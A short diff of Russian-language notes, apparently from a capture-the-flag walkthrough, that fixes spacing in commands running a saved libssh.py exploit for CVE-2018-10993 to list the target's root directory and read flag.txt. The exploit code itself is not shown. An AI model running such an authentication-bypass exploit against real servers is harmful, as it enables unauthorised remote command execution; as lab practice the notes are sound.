@@ -3,7 +3,7 @@
 то что там мы получим гуглим и находим CVE-2018-10993
 сохраняем python file 
 запускаем в терминале 
-python3 libssh.py -p {:after_double_dot} -c 'cd/;  ls -al' {link}
+python3 libssh.py -p {:after_double_dot} -c 'cd /;  ls -al' {link}
 дальше 
-python3 libssh.py -p {:after_double_dot} -c 'cd/; cat flag.txt' {link}
+python3 libssh.py -p {:after_double_dot} -c 'cd /; cat flag.txt' {link}
 
